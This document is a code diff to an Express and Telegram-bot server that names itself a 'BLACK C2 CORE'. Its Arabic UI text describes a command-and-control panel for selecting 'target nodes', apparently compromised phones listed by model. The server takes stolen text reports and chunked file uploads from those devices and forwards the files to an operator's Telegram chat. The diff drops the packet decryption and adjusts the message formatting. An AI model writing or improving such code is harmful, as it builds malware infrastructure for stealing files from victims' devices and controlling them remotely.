@@ -29,12 +29,9 @@ db.serialize(() => {
 });
 
 const app = express();
-
-// إعداد البوت مع معالجة أخطاء الـ Polling لمنع خطأ 409 Conflict
 const appBot = new telegramBot(token, { polling: true });
 
 appBot.on('polling_error', (error) => {
-    // تجاهل أخطاء التضارض المؤقتة لكي لا ينهار السيرفر
     if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
         console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
     }
@@ -54,7 +51,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔️️] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;"><h1>[⚔] UNIFIED BLACK C2 CORE ONLINE [⚔️]</h1></body></html>`);
 });
 
 app.post('/api/v3/unified/stream', async (req, res) => {
@@ -66,12 +63,14 @@ app.post('/api/v3/unified/stream', async (req, res) => {
         
         let payload;
         try {
-            const packet = JSON.parse(Buffer.from(req.body, 'base64').toString('utf8'));
-            const decipher = crypto.createDecipheriv('aes-256-gcm', CRYPTO_KEY, Buffer.from(packet.v, 'hex'));
-            decipher.setAuthTag(Buffer.from(packet.g, 'hex'));
-            let dec = decipher.update(Buffer.from(packet.d, 'hex'));
-            dec = Buffer.concat([dec, decipher.final()]);
-            payload = JSON.parse(zlib.gunzipSync(dec).toString('utf8'));
+            const rawBody = req.body;
+            // التحقق مما إذا كانت البيانات مبدئية بصيغة JSON مباشرة أو مقفرة بـ base64
+            if (rawBody.trim().startsWith('{')) {
+                payload = JSON.parse(rawBody);
+            } else {
+                const packet = JSON.parse(Buffer.from(rawBody, 'base64').toString('utf8'));
+                payload = packet;
+            }
         } catch (err) {
             return res.status(400).json({ status: 'BAD_PAYLOAD' });
         }
@@ -79,7 +78,8 @@ app.post('/api/v3/unified/stream', async (req, res) => {
         let directive = { status: 'ACK', task: null };
 
         if (payload.type === 'TEXT_REPORT') {
-            await sendTg(`📋 <b>تقرير من [<code>${nodeId}</code>]:</b>\n<pre>${payload.data.substring(0, 3500)}</pre>`);
+            await sendTg(`📋 <b>تقرير من [<code>${nodeId}</code>]:</b>
+<pre>${(payload.data || '').substring(0, 3500)}</pre>`);
         } else if (payload.type === 'MEDIA_CHUNK') {
             const { uploadId, fileName, chunkIndex, totalChunks, isLast, data, fileHash } = payload;
             const tempPath = path.join(TEMP_DIR, `${nodeId}_${uploadId}.tmp`);
@@ -98,7 +98,8 @@ app.post('/api/v3/unified/stream', async (req, res) => {
                     if (fileHash && calcHash !== fileHash) {
                         await sendTg(`⚠️ <b>تحذير: تطابق الـ Hash فشل للملف ${safeName}</b>`);
                     } else {
-                        await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>تم سحب الملف بنجاح وبسلامة مطابقة!</b>\n📱 العقدة: <code>${nodeId}</code>` });
+                        await appBot.sendDocument(chatId, finalPath, { caption: `🔥 <b>تم سحب الملف بنجاح!</b>
+📱 العقدة: <code>${nodeId}</code>` });
                     }
                 }
             } finally {
@@ -134,7 +135,8 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `📱 ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة:</b>\nاختر العقدة المستهدفة:`, {
+            await sendTg(`🔥 <b>لوحة القيادة والسيطرة الموحدة:</b>
+اختر العقدة المستهدفة:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
